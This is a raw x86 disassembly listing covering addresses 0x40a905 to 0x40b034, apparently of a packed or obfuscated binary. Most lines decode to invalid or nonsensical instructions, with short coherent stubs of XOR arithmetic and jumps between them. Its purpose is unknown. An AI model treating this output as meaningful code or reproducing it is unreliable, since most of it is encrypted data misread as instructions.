  40a905:	push   edi
  40a906:	cmc    
  40a907:	adc    DWORD PTR fs:[edx],esi
  40a90a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a90b:	cmp    al,0xb4
  40a90d:	(bad)  
  40a90e:	aam    0xcb
  40a910:	cdq    
  40a911:	inc    ebx
  40a912:	xor    al,0xeb
  40a914:	sbb    BYTE PTR [eax+0x2b],ch
  40a917:	(bad)  
  40a918:	xor    bl,BYTE PTR [eax-0x75]
  40a91b:	rol    cl,1
  40a91d:	loopne 0x40a91a
  40a91f:	xor    BYTE PTR [edx-0x45],dh
  40a922:	mov    DWORD PTR [eax],edi
  40a924:	mov    eax,DWORD PTR [ebp-0x14]
  40a927:	mov    ebx,DWORD PTR [ebp-0x8]
  40a92a:	mov    ecx,0x7510850
  40a92f:	xor    eax,ecx
  40a931:	mov    esi,0x327298
  40a936:	jmp    0x40ac4f
  40a93b:	(bad)  
  40a93c:	xlat   BYTE PTR ds:[ebx]
  40a93d:	rcl    bh,1
  40a93f:	aad    0xd7
  40a941:	(bad)
  40a944:	xchg   ebx,eax
  40a945:	cdq    
  40a946:	add    eax,eax
  40a948:	jns    0x40a992
  40a94a:	inc    esi
  40a94b:	fiadd  DWORD PTR [ebx+0x7e747878]
  40a951:	js     0x40a9cb
  40a953:	and    ecx,DWORD PTR [ebx]
  40a955:	push   edx
  40a956:	test   BYTE PTR [ebx+0x29],dh
  40a959:	push   0x25
  40a95b:	and    eax,0x6c2b8c24
  40a960:	adc    BYTE PTR [esi-0x20],ch
  40a963:	sbb    dl,ah
  40a965:	retf   0x9409
  40a968:	lahf   
  40a969:	mov    ebp,0x48e2e2ec
  40a96e:	clc    
  40a96f:	(bad)  
  40a970:	mov    dl,0x9b
  40a972:	leave  
  40a973:	int3   
  40a974:	cld    
  40a975:	push   ds
  40a976:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a977:	sbb    ah,bl
  40a979:	jmp    0x40a98b
  40a97b:	cdq    
  40a97c:	in     al,dx
  40a97d:	lds    ebp,FWORD PTR [ecx+0x2ebb8656]
  40a983:	icebp  
  40a984:	or     al,0xbc
  40a986:	adc    ebp,edx
  40a988:	ficomp WORD PTR [edx+eiz*8+0x55]
  40a98c:	pop    es
  40a98d:	push   edx
  40a98e:	les    edx,FWORD PTR [esp+esi*4+0x5f]
  40a992:	aad    0x2c
  40a994:	scas   al,BYTE PTR es:[edi]
  40a995:	or     DWORD PTR ds:0xaa392ee,ebx
  40a99b:	fild   QWORD PTR ds:0x81e4282c
  40a9a1:	sub    esi,DWORD PTR [esi+0x407efc27]
  40a9a7:	sbb    edi,esi
  40a9a9:	add    DWORD PTR [esp+eax*4],ebp
  40a9ac:	mov    eax,0x3b12c90f
  40a9b1:	test   DWORD PTR [ebp+0x7c],ebx
  40a9b4:	popf   
  40a9b5:	pop    eax
  40a9b6:	pop    DWORD PTR [ebx]
  40a9b8:	imul   esp,DWORD PTR [ebx+0x14],0x7f
  40a9bc:	cmp    al,BYTE PTR [ecx-0x3a]
  40a9bf:	repnz sub eax,0x4391261e
  40a9c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9c6:	mov    edi,0xcf9b9e41
  40a9cb:	hlt    
  40a9cc:	ret    
  40a9cd:	in     eax,dx
  40a9ce:	popa   
  40a9cf:	inc    edi
  40a9d0:	pop    ss
  40a9d1:	ret    0xfba6
  40a9d4:	fisubr WORD PTR [ecx+0x5]
  40a9d7:	clc    
  40a9d8:	lea    ecx,[edx]
  40a9da:	sbb    eax,0x9c39f9d
  40a9df:	xchg   ebx,eax
  40a9e0:	nop
  40a9e1:	jmp    0x8f56:0x860b8f04
  40a9e8:	jo     0x40a9e4
  40a9ea:	aaa    
  40a9eb:	(bad)  
  40a9ec:	arpl   WORD PTR [ecx+0x2264d797],si
  40a9f2:	jmp    0x86170db2
  40a9f7:	xchg   BYTE PTR [esi],bl
  40a9f9:	outs   dx,DWORD PTR ds:[esi]
  40a9fa:	push   ds
  40a9fb:	iret   
  40a9fc:	mov    ebp,0xb9d69549
  40aa01:	mov    cl,0xa3
  40aa03:	jecxz  0x40aa23
  40aa05:	cmp    al,0x22
  40aa07:	fld    DWORD PTR [edx-0x67810b9c]
  40aa0d:	sub    dh,ch
  40aa0f:	xor    ah,ch
  40aa11:	les    edi,FWORD PTR [eax-0x165ba060]
  40aa17:	sbb    DWORD PTR [ecx+0x70],ecx
  40aa1a:	mov    esi,cs
  40aa1c:	ret    0xe4d6
  40aa1f:	rol    BYTE PTR [eax+0x38],0x5b
  40aa23:	aad    0x8c
  40aa25:	inc    esp
  40aa26:	mov    ebp,0xf889797f
  40aa2b:	sahf   
  40aa2c:	pop    esi
  40aa2d:	inc    ebx
  40aa2e:	jne    0x40aa12
  40aa30:	in     al,dx
  40aa31:	iret   
  40aa32:	push   ss
  40aa33:	and    al,0xe3
  40aa35:	mov    ah,0xb
  40aa37:	push   ebp
  40aa38:	mov    ds,WORD PTR [esi]
  40aa3a:	mov    edx,0xb38fff49
  40aa3f:	xchg   edi,eax
  40aa40:	mul    BYTE PTR [ebx]
  40aa42:	mov    edx,0xf77fdff0
  40aa47:	or     DWORD PTR [edi+0x32],ebx
  40aa4a:	mov    ecx,0xbec39778
  40aa4f:	mov    BYTE PTR [esi-0x7e],dl
  40aa52:	jns    0x40aab0
  40aa54:	fdivr  QWORD PTR [ebp+0x1b8f05db]
  40aa5a:	add    BYTE PTR [ecx],dh
  40aa5c:	xlat   BYTE PTR ds:[ebx]
  40aa5d:	or     edx,DWORD PTR [ebx-0x2c2522c1]
  40aa63:	sub    DWORD PTR [esi-0x17e9f1b8],0x13
  40aa6a:	cmp    esp,DWORD PTR [edx+0x2a]
  40aa6d:	mov    esp,0x40e711b7
  40aa72:	pop    ss
  40aa73:	test   DWORD PTR [edx-0x2e333e7e],esp
  40aa79:	inc    ebx
  40aa7a:	pop    ebx
  40aa7b:	enter  0x8590,0x5d
  40aa7f:	sti    
  40aa80:	aad    0x67
  40aa82:	out    0x3a,al
  40aa84:	cmp    BYTE PTR [eax],al
  40aa86:	lods   al,BYTE PTR ds:[esi]
  40aa87:	leave  
  40aa88:	lock cmp DWORD PTR [ebp+ebp*4-0x5f],edi
  40aa8d:	dec    esi
  40aa8e:	xor    eax,0x249ce695
  40aa93:	daa    
  40aa94:	jae    0x40ab11
  40aa96:	fwait
  40aa97:	dec    edx
  40aa98:	shr    DWORD PTR [edx-0xf],cl
  40aa9b:	jae    0x40aae5
  40aa9d:	and    eax,0x42541bbd
  40aaa2:	mov    ebx,0x36bb4e6a
  40aaa7:	lods   al,BYTE PTR ds:[esi]
  40aaa8:	dec    ebx
  40aaa9:	popf   
  40aaaa:	sub    al,0xce
  40aaac:	in     eax,dx
  40aaad:	mov    esi,cs
  40aaaf:	outs   dx,DWORD PTR ds:[esi]
  40aab0:	push   edi
  40aab1:	dec    ecx
  40aab2:	pop    ecx
  40aab3:	(bad)  
  40aab5:	stc    
  40aab6:	mov    ecx,0xe4373fd6
  40aabb:	xchg   edx,eax
  40aabc:	mov    ah,0x71
  40aabe:	inc    ebx
  40aabf:	(bad)  
  40aac3:	dec    esp
  40aac4:	stos   DWORD PTR es:[edi],eax
  40aac5:	repz scas al,BYTE PTR es:[edi]
  40aac7:	sti    
  40aac8:	ret    
  40aac9:	(bad)  
  40aaca:	fsub   QWORD PTR [ecx-0x6ab98025]
  40aad0:	stc    
  40aad1:	or     esp,DWORD PTR [esi]
  40aad3:	stos   BYTE PTR es:[edi],al
  40aad4:	mov    dh,BYTE PTR gs:[edx-0x3fa101e1]
  40aadb:	or     bl,BYTE PTR [ebp+0x13f6d512]
  40aae1:	pusha  
  40aae2:	pop    ds
  40aae3:	xor    bh,al
  40aae5:	nop
  40aae6:	add    eax,DWORD PTR [esi-0x3c]
  40aae9:	lahf   
  40aaea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aaeb:	nop
  40aaec:	add    BYTE PTR ds:0x7ad624e8,al
  40aaf2:	fsubr  QWORD PTR [ebp+0x8]
  40aaf5:	mov    bh,0x17
  40aaf7:	push   ebp
  40aaf8:	or     al,0xb3
  40aafa:	lock not DWORD PTR ds:0x9d87de54
  40ab01:	inc    edx
  40ab02:	inc    esi
  40ab03:	or     eax,0x1610d9ce
  40ab08:	adc    al,0x39
  40ab0a:	sbb    eax,0x2d3c1dcd
  40ab0f:	push   ss
  40ab10:	xor    al,BYTE PTR [ecx+0x10]
  40ab13:	inc    ecx
  40ab14:	and    DWORD PTR [edx],eax
  40ab16:	push   ebp
  40ab17:	jb     0x40aae3
  40ab19:	push   0x1a
  40ab1b:	inc    edx
  40ab1c:	jl     0x40ab66
  40ab1e:	cmp    DWORD PTR [ebx],esp
  40ab20:	cmp    al,ch
  40ab22:	cmp    edi,DWORD PTR [ebp+0x7b]
  40ab25:	fnstenv [ebx-0x7d1d7439]
  40ab2b:	jbe    0x40ab75
  40ab2d:	pop    ecx
  40ab2f:	test   al,0x43
  40ab31:	call   0x92bd:0x97e3b45a
  40ab38:	or     edx,DWORD PTR [eax]
  40ab3a:	push   0x23
  40ab3c:	lahf   
  40ab3d:	sbb    BYTE PTR [edi+0x41],al
  40ab40:	mov    ecx,0x8733d35c
  40ab45:	out    dx,eax
  40ab46:	xchg   edx,eax
  40ab47:	sahf   
  40ab48:	test   BYTE PTR [eax],al
  40ab4a:	and    ch,BYTE PTR [edx+0x4b]
  40ab4d:	jl     0x40aad9
  40ab4f:	or     BYTE PTR [edx-0x5d],cl
  40ab52:	dec    ebp
  40ab53:	xor    ecx,DWORD PTR ds:0xf6d0d39e
  40ab59:	test   BYTE PTR [eax+0x62],ch
  40ab5c:	imul   eax,DWORD PTR [ecx],0x30
  40ab5f:	fdivr  QWORD PTR [edi-0x21dbba11]
  40ab65:	mov    ?,WORD PTR [edi+ebp*4]
  40ab68:	hlt    
  40ab69:	(bad)  
  40ab6a:	outs   dx,DWORD PTR ds:[esi]
  40ab6b:	cmp    BYTE PTR [esi-0xb],cl
  40ab6e:	and    ebx,esi
  40ab70:	nop
  40ab71:	or     ecx,DWORD PTR ds:0x3d9d
  40ab76:	jmp    0x9982407
  40ab7b:	sub    ch,BYTE PTR [edi+ecx*2+0x36]
  40ab7f:	jno    0x40ab6e
  40ab81:	fcomp  QWORD PTR [ebp-0x4ec5f213]
  40ab87:	or     al,0xb3
  40ab89:	repz mov ah,0xdc
  40ab8c:	(bad)  
  40ab8d:	jle    0x40abc4
  40ab8f:	aad    0xb4
  40ab91:	fidiv  WORD PTR [edi+0x5a9963a0]
  40ab97:	ret    
  40ab98:	stc    
  40ab99:	cmp    eax,0x2649969a
  40ab9e:	pop    eax
  40ab9f:	mov    ebp,0xb2e4afa6
  40aba4:	push   ecx
  40aba5:	push   cs
  40aba6:	cmp    al,0xaf
  40aba8:	push   ds
  40aba9:	fwait
  40abaa:	mov    esp,0x30707817
  40abaf:	in     eax,0xa2
  40abb1:	imul   eax,DWORD PTR [eax-0x6],0xb89e539e
  40abb8:	adc    ah,bh
  40abba:	push   esp
  40abbb:	sbb    ebp,ebp
  40abbd:	jmp    0x5df08eeb
  40abc2:	fisub  WORD PTR [ebp-0x30]
  40abc5:	gs clc 
  40abc7:	sbb    cl,al
  40abc9:	leave  
  40abca:	pop    es
  40abcb:	push   esi
  40abcc:	fs xchg ebx,eax
  40abce:	mov    ch,0x5e
  40abd0:	xchg   ebp,eax
  40abd1:	or     al,0xc
  40abd3:	es stos DWORD PTR es:[edi],eax
  40abd5:	mov    ebp,0x18e91f1b
  40abda:	jne    0x40abd1
  40abdc:	xor    esp,DWORD PTR [esi+edi*8]
  40abdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abe0:	and    BYTE PTR [ebx+0x52eec691],dh
  40abe6:	xor    BYTE PTR [eax],al
  40abe8:	cmp    al,0xbc
  40abea:	push   0x14
  40abec:	push   ebp
  40abed:	sbb    cl,dl
  40abef:	jo     0x40ac45
  40abf1:	mov    DWORD PTR [ebx+0x34b5ba2e],edi
  40abf7:	pop    ebx
  40abf8:	ret    0xa77c
  40abfb:	es or  eax,0x95e1d1be
  40ac01:	test   eax,edx
  40ac03:	mov    edi,0xe8a06343
  40ac08:	sahf   
  40ac09:	out    dx,al
  40ac0a:	or     BYTE PTR [ebp+0xc],dh
  40ac0d:	push   ebx
  40ac0e:	sahf   
  40ac0f:	push   ds
  40ac10:	pop    ss
  40ac11:	push   cs
  40ac12:	lods   al,BYTE PTR ds:[esi]
  40ac13:	outs   dx,DWORD PTR ds:[esi]
  40ac14:	(bad)  
  40ac15:	fadd   st(3),st
  40ac17:	sbb    eax,0xfbf4c574
  40ac1c:	mov    bh,0x53
  40ac1e:	cwde   
  40ac1f:	xchg   edx,eax
  40ac20:	mov    edi,0x148d396e
  40ac25:	and    eax,0x8b450582
  40ac2a:	sub    dl,0x7
  40ac2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac2e:	std    
  40ac2f:	neg    ecx
  40ac31:	fwait
  40ac32:	pop    ebp
  40ac33:	mov    ?,WORD PTR [edx]
  40ac35:	scas   eax,DWORD PTR es:[edi]
  40ac36:	test   eax,0x8c931047
  40ac3b:	and    DWORD PTR [esi],esi
  40ac3d:	sub    al,0x16
  40ac3f:	inc    esi
  40ac40:	push   edi
  40ac41:	pushf  
  40ac42:	jne    0x40ac6a
  40ac44:	and    edx,0x6bcebd32
  40ac4a:	pop    eax
  40ac4b:	adc    al,0xe
  40ac4d:	aad    0x87
  40ac4f:	xor    ebx,ecx
  40ac51:	xor    edx,edx
  40ac53:	add    eax,esi
  40ac55:	add    ebx,esi
  40ac57:	div    ebx
  40ac59:	mov    edx,DWORD PTR [ebp-0x20]
  40ac5c:	mov    DWORD PTR [ebp-0x2c],0x4f35
  40ac63:	cmp    eax,DWORD PTR [edx]
  40ac65:	je     0x40c955
  40ac6b:	mov    DWORD PTR [ebp-0xc],0x705fd8e
  40ac72:	lea    eax,[ebp-0xc]
  40ac75:	mov    DWORD PTR [ebp-0x10],eax
  40ac78:	mov    eax,DWORD PTR [ebp-0x10]
  40ac7b:	jmp    0x40af94
  40ac80:	aas    
  40ac81:	aas    
  40ac82:	iret   
  40ac83:	(bad)  
  40ac84:	iret   
  40ac85:	xlat   BYTE PTR ds:[ebx]
  40ac86:	xlat   BYTE PTR ds:[ebx]
  40ac87:	(bad)  
  40ac88:	fist   WORD PTR [eax]
  40ac8a:	push   eax
  40ac8b:	psrlq  mm0,QWORD PTR [ebp-0x77]
  40ac8f:	ins    BYTE PTR es:[edi],dx
  40ac90:	(bad)  
  40ac91:	cmp    BYTE PTR [eax+0x78],0x74
  40ac95:	jle    0x40ad0f
  40ac97:	js     0x40ac5a
  40ac99:	(bad)  
  40ac9a:	mov    ecx,0x705cce68
  40ac9f:	hlt    
  40aca0:	inc    ecx
  40aca1:	or     al,0x8f
  40aca3:	neg    BYTE PTR [edx+0x36]
  40aca6:	std    
  40aca7:	data16 fcomi st,st(2)
  40acaa:	int    0x17
  40acac:	jnp    0x40ad18
  40acae:	dec    edi
  40acaf:	mov    eax,0xc43f7aa6
  40acb4:	push   eax
  40acb5:	or     ebp,DWORD PTR [ecx-0x80]
  40acb8:	mov    ebp,0xb4f93ade
  40acbd:	or     cl,BYTE PTR [eax]
  40acbf:	xor    al,0x75
  40acc1:	push   edx
  40acc2:	out    0x6b,eax
  40acc4:	push   esp
  40acc5:	retf   0xc377
  40acc8:	clc    
  40acc9:	adc    DWORD PTR [ebx+0x3c5a8dbc],0x9682dd98
  40acd3:	addr16 pop edi
  40acd5:	repnz or BYTE PTR [edi+0x3c],ah
  40acd9:	fwait
  40acda:	mov    eax,0x2e179016
  40acdf:	fldl2e 
  40ace1:	stc    
  40ace2:	dec    eax
  40ace3:	or     DWORD PTR [eax+0x30],ecx
  40ace6:	mov    ch,0x75
  40ace8:	jns    0x40ac79
  40acea:	out    0xf0,al
  40acec:	cmp    eax,0xb194d4
  40acf1:	or     edx,DWORD PTR [edi]
  40acf3:	imul   esi,DWORD PTR [ebx+0x6b881820],0x20
  40acfa:	fdiv   QWORD PTR [ebp+0x7f069532]
  40ad00:	mov    ds,esp
  40ad02:	data16 shl BYTE PTR [eax+esi*2+0x6dc0d90f],0xd2
  40ad0b:	add    esi,edi
  40ad0d:	clc    
  40ad0e:	mov    esi,0xbc872daf
  40ad13:	daa    
  40ad14:	xchg   ebp,eax
  40ad15:	or     DWORD PTR [edi-0x65],0xc7bc173f
  40ad1c:	xchg   esp,eax
  40ad1d:	jecxz  0x40ad09
  40ad1f:	adc    ebx,ebx
  40ad21:	push   eax
  40ad22:	fstp   TBYTE PTR [edi-0x6924f24e]
  40ad28:	retf   0x191b
  40ad2b:	pop    ds
  40ad2c:	add    DWORD PTR [eax-0x231f37c8],ecx
  40ad32:	cmp    ecx,DWORD PTR [ebx]
  40ad34:	mov    ebx,0x5603783e
  40ad39:	call   0xa6ba:0xf27d147b
  40ad40:	mov    ds:0x7c4d7a53,eax
  40ad45:	cmc    
  40ad46:	ret    0xa774
  40ad49:	(bad)  
  40ad4a:	fstp   TBYTE PTR [edx]
  40ad4c:	and    al,0x50
  40ad4e:	xchg   ebp,eax
  40ad4f:	aam    0xdf
  40ad51:	xchg   ecx,eax
  40ad52:	inc    esp
  40ad53:	cmp    ebp,esi
  40ad55:	scas   eax,DWORD PTR es:[edi]
  40ad56:	push   ecx
  40ad57:	or     ebx,DWORD PTR [esi-0x2a]
  40ad5a:	cdq    
  40ad5b:	(bad)  
  40ad5c:	mov    edi,0x8c61a5df
  40ad61:	jnp    0x40ad5a
  40ad63:	sbb    ebp,ebp
  40ad65:	xor    BYTE PTR [edi+0x3a],ah
  40ad68:	jle    0x40ad35
  40ad6a:	pop    ebp
  40ad6b:	inc    eax
  40ad6c:	or     bh,BYTE PTR [esi+0x119b0c92]
  40ad72:	not    dh
  40ad74:	(bad)  
  40ad75:	shl    BYTE PTR [eax-0x15fbe724],1
  40ad7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad7c:	sub    DWORD PTR [esp+eax*2-0x1a],ebp
  40ad80:	ficomp WORD PTR [esp+edi*8]
  40ad83:	pushf  
  40ad84:	aas    
  40ad85:	(bad)  
  40ad86:	icebp  
  40ad87:	pop    edi
  40ad88:	cld    
  40ad89:	sub    edx,DWORD PTR [ecx]
  40ad8b:	and    ch,BYTE PTR [edx+edi*1]
  40ad8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad8f:	out    0x22,al
  40ad91:	es pop edx
  40ad93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad94:	sbb    dh,BYTE PTR [esi-0x3504bab6]
  40ad9a:	adc    ebx,DWORD PTR [ebp-0x2a4a8b50]
  40ada0:	scas   eax,DWORD PTR es:[edi]
  40ada1:	mov    bl,0x38
  40ada3:	dec    esi
  40ada4:	mov    ah,0x58
  40ada6:	sbb    al,0x1b
  40ada8:	pop    edi
  40ada9:	pop    esp
  40adaa:	mov    WORD PTR [ecx],fs
  40adac:	push   edx
  40adad:	fcomi  st,st(3)
  40adaf:	in     al,dx
  40adb0:	fdiv   st,st(5)
  40adb2:	inc    ebx
  40adb3:	jl     0x40ad8f
  40adb5:	jle    0x40ad49
  40adb7:	and    BYTE PTR [edx+eiz*8-0x28bd150c],dl
  40adbe:	adc    BYTE PTR [ebx+edx*8+0x2ca7b0b9],dl
  40adc5:	adc    esi,DWORD PTR ds:0x799bb105
  40adcb:	fucomi st,st(2)
  40adcd:	cmp    ch,bl
  40adcf:	(bad)  
  40add0:	fdivr  DWORD PTR [ebp+0x3d]
  40add3:	pmaxsw mm3,QWORD PTR [esi]
  40add6:	xor    ecx,DWORD PTR [eax+edx*8-0x555edefe]
  40addd:	in     eax,dx
  40adde:	cmp    BYTE PTR [ecx+ecx*1],bh
  40ade1:	jns    0x40ae2e
  40ade3:	jecxz  0x40ae5c
  40ade5:	ins    DWORD PTR es:[edi],dx
  40ade6:	add    BYTE PTR [esi-0x1e],al
  40ade9:	xchg   BYTE PTR [edi],bh
  40adeb:	mov    DWORD PTR [eax-0x18],eax
  40adee:	xlat   BYTE PTR ds:[ebx]
  40adef:	jecxz  0x40ade7
  40adf1:	pop    eax
  40adf2:	(bad)
  40adf5:	(bad)  
  40adf6:	imul   edi,DWORD PTR [esi],0x30
  40adf9:	push   eax
  40adfa:	xchg   ebx,eax
  40adfb:	push   eax
  40adfc:	add    BYTE PTR [edi+0x2a],cl
  40adff:	std    
  40ae00:	nop
  40ae01:	or     cl,0x7e
  40ae04:	mov    al,0xb0
  40ae06:	and    al,0x37
  40ae08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae09:	fisubr WORD PTR [edx-0x6ed9c0d9]
  40ae0f:	imul   esi,DWORD PTR [esi],0xc3af53ae
  40ae15:	jo     0x40ae05
  40ae17:	fwait
  40ae18:	mov    WORD PTR es:[ebx],ds
  40ae1b:	inc    ecx
  40ae1c:	add    al,0xaa
  40ae1e:	fimul  DWORD PTR [eax]
  40ae20:	dec    esi
  40ae21:	or     dl,bl
  40ae23:	sub    ah,BYTE PTR [ebp+0x30d64d61]
  40ae29:	mov    BYTE PTR [eax],bl
  40ae2b:	push   cs
  40ae2c:	sbb    eax,0xfdc7b1ff
  40ae31:	jp     0x40ae9a
  40ae33:	stos   BYTE PTR es:[edi],al
  40ae34:	mov    ds:0xef58a9eb,al
  40ae39:	popa   
  40ae3a:	mov    ecx,0x61d1b1b0
  40ae3f:	add    eax,0xdfd44ded
  40ae44:	hlt    
  40ae45:	add    ecx,DWORD PTR [ebx+0x3e]
  40ae48:	(bad)  
  40ae49:	jno    0x40ae63
  40ae4b:	arpl   di,ax
  40ae4d:	cwde   
  40ae4e:	push   ecx
  40ae4f:	iret   
  40ae50:	push   edx
  40ae51:	jo     0x40ae79
  40ae53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae54:	out    dx,eax
  40ae55:	fsubr  DWORD PTR [edx]
  40ae57:	xor    BYTE PTR [edi-0x6a],ch
  40ae5a:	mov    ecx,0x28f816c6
  40ae5f:	jbe    0x40ae65
  40ae61:	sub    al,0xb0
  40ae63:	sbb    ebx,DWORD PTR [ebx-0x953fd81]
  40ae69:	mov    ch,BYTE PTR [edx]
  40ae6b:	and    DWORD PTR [edi+0x621c1d9f],ebp
  40ae71:	mov    dl,0xca
  40ae73:	mov    DWORD PTR [ebx],ecx
  40ae75:	sbb    al,0xde
  40ae77:	fwait
  40ae78:	mov    al,0xf
  40ae7a:	mov    ch,BYTE PTR [edx+0x1dff1b78]
  40ae80:	out    dx,eax
  40ae81:	popf   
  40ae82:	dec    esi
  40ae83:	or     eax,DWORD PTR ds:0xd648b072
  40ae89:	inc    ecx
  40ae8a:	stos   DWORD PTR es:[edi],eax
  40ae8b:	pusha  
  40ae8c:	cld    
  40ae8d:	cmp    al,0x7b
  40ae8f:	or     cl,BYTE PTR [eax+0x32]
  40ae92:	mov    al,ds:0x9807257d
  40ae97:	sub    dl,al
  40ae99:	je     0x40aebd
  40ae9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae9c:	in     al,dx
  40ae9d:	div    BYTE PTR [edx-0x5d43b99]
  40aea3:	nop
  40aea4:	cdq    
  40aea5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aea6:	outs   dx,BYTE PTR ds:[esi]
  40aea7:	lods   al,BYTE PTR ds:[esi]
  40aea8:	int3   
  40aea9:	pop    es
  40aeaa:	fld    st(6)
  40aeac:	gs xchg esi,ebx
  40aeaf:	fidiv  DWORD PTR [edx+0x5]
  40aeb2:	and    al,0x70
  40aeb4:	push   esp
  40aeb5:	mov    eax,ds:0x144f94b3
  40aeba:	mov    ds,WORD PTR [edx-0x28aacefd]
  40aec0:	xchg   edx,eax
  40aec1:	mov    ah,0x35
  40aec3:	or     DWORD PTR [esi],esp
  40aec5:	cmp    al,0xb
  40aec7:	add    al,0x64
  40aec9:	iret   
  40aeca:	push   ebp
  40aecb:	pop    es
  40aecc:	cli    
  40aecd:	xor    edi,DWORD PTR [edi+0x181647b8]
  40aed3:	jmp    0x5f15:0xdee73aa6
  40aeda:	push   esp
  40aedb:	mov    esi,0x77e22f40
  40aee0:	(bad)  
  40aee1:	sahf   
  40aee2:	dec    edx
  40aee3:	lea    edi,[edi+0x79]
  40aee6:	in     eax,0x18
  40aee8:	xor    al,0xb9
  40aeea:	ret    
  40aeeb:	add    eax,0xffd9477b
  40aef0:	lods   al,BYTE PTR ds:[esi]
  40aef1:	ins    BYTE PTR es:[edi],dx
  40aef2:	js     0x40af71
  40aef4:	mov    BYTE PTR [ebp-0x79],cl
  40aef7:	cmp    BYTE PTR [edi+0x64],al
  40aefa:	inc    esp
  40aefb:	out    0x6f,eax
  40aefd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aefe:	push   ecx
  40aeff:	and    BYTE PTR es:[eax-0x182aa06f],0x70
  40af07:	mov    edi,0x4e0f5d13
  40af0c:	outs   dx,DWORD PTR ds:[esi]
  40af0d:	sbb    ebp,DWORD PTR [edx+eax*4]
  40af10:	mov    bh,0xad
  40af12:	mov    ecx,0x9002e70a
  40af17:	leave  
  40af18:	mov    al,ds:0xb9977208
  40af1d:	es ret 
  40af1f:	pop    ecx
  40af20:	jno    0x40af4d
  40af22:	ja     0x40af93
  40af24:	rol    DWORD PTR [esi-0x34],cl
  40af27:	sub    bl,BYTE PTR [ebx]
  40af29:	data16 aam 0x28
  40af2c:	repz xchg edx,eax
  40af2e:	pusha  
  40af2f:	jmp    0x40af7a
  40af31:	push   0x526b921b
  40af36:	leave  
  40af37:	leave  
  40af38:	or     DWORD PTR [esi],ebp
  40af3a:	icebp  
  40af3b:	sub    ebx,esp
  40af3d:	es jp  0x40af10
  40af40:	je     0x40aefd
  40af42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af43:	and    esi,DWORD PTR [eax+ecx*1]
  40af46:	pop    DWORD PTR [edx+0x43]
  40af49:	push   cs
  40af4a:	fld    DWORD PTR [edi-0x4356fa9e]
  40af50:	pop    es
  40af51:	adc    bl,BYTE PTR [edi-0x12]
  40af54:	adc    DWORD PTR [esi-0x4b5e020c],ecx
  40af5a:	sbb    BYTE PTR [edx-0x40f7665d],ah
  40af60:	idiv   BYTE PTR [ebp+0xa]
  40af63:	pop    ss
  40af64:	jno    0x40af4a
  40af66:	add    bh,cl
  40af68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af69:	push   es
  40af6a:	jns    0x40af33
  40af6c:	dec    esp
  40af6d:	cmp    esi,DWORD PTR [ecx]
  40af6f:	js     0x40afad
  40af71:	sub    DWORD PTR [esi],edi
  40af73:	lea    esp,[edx+0x3a5fb86e]
  40af79:	sbb    eax,0x904d542c
  40af7e:	xchg   ebp,eax
  40af7f:	mov    ah,BYTE PTR [eax]
  40af81:	adc    esp,DWORD PTR [ecx+0x4b]
  40af84:	aad    0xd5
  40af86:	out    0x34,eax
  40af88:	add    eax,0x65d285b4
  40af8d:	and    edx,DWORD PTR [edi]
  40af8f:	sub    BYTE PTR [ebp-0x1],0xb3
  40af93:	mov    cl,BYTE PTR [ebx-0x122d96f0]
  40af99:	test   eax,0x1089f89e
  40af9e:	mov    eax,DWORD PTR [ebp-0xc]
  40afa1:	jmp    0x40b2ba
  40afa6:	sar    DWORD PTR ds:0xc9d9c1c9,cl
  40afac:	fcmovne st,st(5)
  40afae:	mov    bl,0x22
  40afb0:	fsub   st(2),st
  40afb2:	pop    esi
  40afb3:	adc    esi,esp
  40afb5:	loopne 0x40af89
  40afb7:	test   DWORD PTR [eax+0x78],edi
  40afba:	je     0x40b03a
  40afbc:	js     0x40b036
  40afbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afbf:	mov    edi,0x3797299
  40afc4:	sub    bl,dh
  40afc6:	repz out 0xcd,eax
  40afc9:	mov    WORD PTR [ebx],es
  40afcb:	jns    0x40afe3
  40afcd:	jle    0x40afc7
  40afcf:	cmp    eax,0x40a957f1
  40afd4:	jae    0x40afcc
  40afd6:	add    eax,0xcb5df761
  40afdb:	ret    0x1981
  40afde:	sub    eax,0x66db669e
  40afe3:	aad    0xcb
  40afe5:	add    ecx,DWORD PTR [ebp-0x20]
  40afe8:	aaa    
  40afe9:	into   
  40afea:	or     al,0x55
  40afec:	leave  
  40afed:	lods   al,BYTE PTR ds:[esi]
  40afee:	pop    ebx
  40afef:	or     eax,DWORD PTR [edx]
  40aff1:	mov    ds:0xf0e40e48,eax
  40aff6:	dec    ecx
  40aff7:	dec    ecx
  40aff8:	sbb    eax,0x797c1e0
  40affd:	jp     0x40b01a
  40afff:	adc    eax,0xb3d5be6c
  40b004:	mov    dl,0x88
  40b006:	mov    ecx,0x4e6d7a93
  40b00b:	sub    cl,BYTE PTR [edi]
  40b00d:	scas   eax,DWORD PTR es:[edi]
  40b00e:	in     eax,0xee
  40b010:	into   
  40b011:	dec    ebp
  40b012:	fnstsw WORD PTR [edx+0x4a9f7cfc]
  40b018:	pop    ecx
  40b019:	lock push cs
  40b01b:	(bad)  
  40b01c:	jns    0x40afe1
  40b01e:	jo     0x40b014
  40b020:	pop    edi
  40b021:	adc    al,0x4f
  40b023:	xlat   BYTE PTR ds:[ebx]
  40b024:	outs   dx,BYTE PTR ds:[esi]
  40b025:	out    dx,eax
  40b026:	xor    edx,ebp
  40b028:	mov    esi,0x87a78f09
  40b02d:	pop    esi
  40b02e:	mov    ecx,0xbbfe5e8c
  40b033:	xchg   edi,eax
  40b034:	cmp    ah,BYTE PTR [ebx]
